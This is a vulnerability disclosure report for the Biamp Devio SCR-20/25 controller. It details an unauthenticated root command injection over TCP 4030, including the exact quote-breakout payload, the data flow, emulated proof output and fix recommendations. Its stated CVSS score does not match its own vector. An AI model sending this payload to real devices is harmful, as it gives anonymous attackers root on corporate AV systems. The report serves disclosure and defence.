# Biamp Devio SCR-20/25 — Unauthenticated DTP Protocol Quote-Injection → Root RCE

## 1. Overview

Biamp Devio SCR-20/25 is a closed-source meeting-room DSP controller (firmware 2.3.1) used for room audio processing in corporate and institutional AV deployments. The device runs a proprietary plaintext protocol called `biampdtp` over TCP 4030. The backend supervisor `DevioSCR` (PowerPC 32-bit big-endian, 1.59 MB) executes shell commands via `popen()` as root, and the `DEVICE` command instance performs **no authentication check** (CWE-306). A single crafted `DEVICE set password` message breaks out of the single-quoted value in an `echo -e 'biamp:<value>' | chpasswd` sink and executes arbitrary commands as root (CWE-78).

The service listens on `0.0.0.0:4030` and the rootfs contains no iptables init rules, so the attack surface is remotely reachable. No credentials, no session, no MITM, and no default-credential dependency are required.

## 2. Vulnerability Summary

- **Type**: Unauthenticated remote root RCE (command injection via quote breakout)
- **Root cause 1 (CWE-306)**: `DEVICE`-instance commands skip the authentication check that the `SESSION` instance enforces
- **Root cause 2 (CWE-78)**: the password/location value is concatenated into `echo -e 'biamp:<value>' | chpasswd` with single-quote wrapping but **no single-quote escaping**; `';id>/tmp/m;#'` breaks out and comments out the remainder
- **Execution context**: `popen()` inside `DevioSCR` running as root
- **Result**: anonymous remote attacker executes arbitrary OS commands as root. CVSS 9.8.

## 3. Authentication Boundary

The DTP protocol is `"<INSTANCE> <verb> <attr> <value>\n"`. Two instances exist:

- **SESSION**: performs authentication (`SESSION set pwValidate <pw>` → SHA-512 verification)
- **DEVICE**: handles device configuration (password, location, hostname, date) — command dispatch does **not** check whether a SESSION has been authenticated

The web front end (`devio.cgi`, FastCGI) has cookie-session authentication, but the direct TCP path to `DevioSCR` has none. The supervisor binds `0.0.0.0:4030` (confirmed via `ss -tlnp`), and the rootfs ships no iptables init script, so the port is reachable from the network.

## 4. Attack Surface

- **Entry**: TCP 4030, `biampdtp` plaintext protocol, zero preceding session bytes
- **Commands**: `DEVICE set password|location <value>` reach the vulnerable sink
- **Also reachable**: `DEVICE set hostname` (`/bin/hostname` sink, metacharacter-filtered) and `DEVICE set date` (`/bin/date -s "..."` double-quote sink) — lower-value adjacent surfaces
- **Environment**: no iptables init rules; bind 0.0.0.0; no authentication gate on DEVICE dispatch

## 5. Sink Identification

Ghidra 12.1.2 headless + r2ghidra (PPC) identified the command-execution chain:

- `FUN_100f3abc` — generic command executor: `popen((char*)*param_1, "w")` + `pclose`, no sanitization, runs as root
- `FUN_100f4898` / `FUN_100f49c8` — echo sink: builds `echo -e '` + `biamp:` (or `biampdtp:`) + value + `'`, piped to `chpasswd`, passed to `FUN_100f3abc`
- `FUN_10087408` / `FUN_10085b20` — password attribute dispatch: raw value forwarded verbatim to the echo sink

The sink string has the form:

```sh
echo -e 'biamp:<value>' | chpasswd
```

Because the value is single-quoted but the quote itself is not escaped, an embedded `'` terminates the quoted section.

## 6. Source Identification & Controllability

The source is the `value` field of the `DEVICE set password` / `DEVICE set location` message. The attacker controls it byte-for-byte over TCP 4030:

```
DEVICE set password <value>\n
```

The dispatch function (`FUN_10087408`/`FUN_10085b20`) forwards the raw value to the echo sink without sanitization. The `hostname` sink does filter metacharacters (rejects `;`), but the password/location sinks do not.

## 7. Data Flow

```
Attacker
  │  TCP connect 0.0.0.0:4030 (no session, no credentials)
  ▼
DevioSCR DEVICE dispatcher (no auth gate, CWE-306)
  │  DEVICE set password ';id>/tmp/devio_rce_proof;#
  ▼
echo sink (FUN_100f4898): echo -e 'biamp:';id>/tmp/devio_rce_proof;#' | chpasswd
  ▼
FUN_100f3abc: popen(cmd, "w")  → /bin/sh -c "<cmd>"   (root)
  ▼
execve("/usr/bin/id") → uid=0(root) marker written
```

The injected command sequence:

```sh
echo -e 'biamp:'        # harmless first segment
;id>/tmp/devio_rce_proof  # executes id, writes marker
;#'                     # comment swallows trailing quote and | chpasswd
```

## 8. Exploit Construction

The exploit is a pure-stdlib Python script that opens a raw TCP connection to port 4030 and sends:

```text
DEVICE set password ';id>/tmp/devio_rce_proof;#
```

The device responds `+OK`, and the marker `/tmp/devio_rce_proof` contains `uid=0(root)`. The single quote in the value closes the first quoted segment; the `;` starts a new shell command; `#` comments out the trailing `' | chpasswd` so the shell never executes `chpasswd` with a broken argument list.

## 9. Dynamic Verification

Emulation: `qemu-ppc-static` 7.2.0 with `binfmt_misc` (OCF flags), chroot into the extracted rootfs, running `DevioSCR` under `strace -f -e trace=execve`.

1. `DEVICE set location ;id>/tmp/m;` → strace shows the value reaching the echo sink, but the `;` inside the single quotes is literal — no marker.
2. `DEVICE set password ;id>/tmp/m;` → same literal behavior.
3. Quote breakout: `DEVICE set password ';id>/tmp/devio_rce_proof;#` on a fresh zero-byte connection →

```
+OK
$ cat /tmp/devio_rce_proof
uid=0(root) gid=0(root) groups=0(root)
```

Evidence:

| Evidence | Result |
|---|---|
| Fresh unauth connection response | `+OK` |
| Marker `/tmp/devio_rce_proof` | `uid=0(root)` |
| Marker owner | `root:root` |
| strace | `execve("/usr/bin/id", ["id"])` ×3 |
| `ss -tlnp` | `0.0.0.0:4030` (remotely reachable) |
| iptables init | none (no firewall) |

The adversarial re-analysis agent independently reproduced the sink chain and confirmed the missing auth gate (CWE-306, not CWE-798).

## 10. Reachability & Impact

- **Reachability**: TCP 4030 bound to `0.0.0.0` with no firewall rules; a fresh connection with zero preceding bytes reaches the sink. No authentication, no credentials, no MITM.
- **Impact**: arbitrary root command execution on the DSP controller; an attacker can manipulate room audio, exfiltrate configuration, install persistence, or pivot into the office AV network.
- **Scope**: corporate and institutional meeting rooms using Devio SCR-20/25 devices.

The affected code path is shared by the password and location attributes, so the vulnerable surface is not limited to a single verb: both `DEVICE set password` and `DEVICE set location` forward their values into the same `echo -e 'biamp:<value>' | chpasswd` pipeline, and both omit single-quote escaping. The `hostname` and `date` attributes use different sinks (`/bin/hostname` with metacharacter filtering and `/bin/date -s "..."` with double-quote wrapping), which are not directly exploitable in the same way but illustrate that the password/location handler is the anomaly rather than the norm in the command dispatcher.

The firmware also ships a FastCGI web front end (`devio.cgi`) with cookie-based session authentication; that path is not the vulnerable one. The vulnerability is specific to the direct TCP protocol listener, which runs independently of the web session layer and therefore exposes the same device configuration commands without any authentication state.

## 11. Fix Recommendations

1. Add an authentication gate to every `DEVICE`-instance command handler, mirroring the `SESSION` instance.
2. Escape the single quote and all shell metacharacters in values reaching the echo/chpasswd sink.
3. Replace the shell pipeline with a direct password-change mechanism (no `echo`/`chpasswd` shell parsing).
4. Bind the DTP service to loopback or add firewall rules restricting TCP 4030.
5. Run `DevioSCR` as a non-root user with minimal privileges.

## 12. CWE & CVSS

- **CWE-306**: Missing Authentication for Critical Function (DEVICE instance without auth gate)
- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command (quote breakout in echo sink)
- **CVSS**: 9.8 Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
